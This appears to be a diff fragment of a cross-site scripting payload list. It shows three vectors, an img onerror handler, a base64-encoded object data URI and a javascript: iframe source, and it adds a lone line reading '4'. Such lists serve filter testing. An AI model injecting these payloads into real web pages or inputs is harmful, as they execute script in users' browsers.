@@ -4,3 +4,4 @@
 <img src=1 onerror=alert(document.domain)>
 <object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
 <iframe src="\x01javascript:alert(0)"></iframe> 
+4
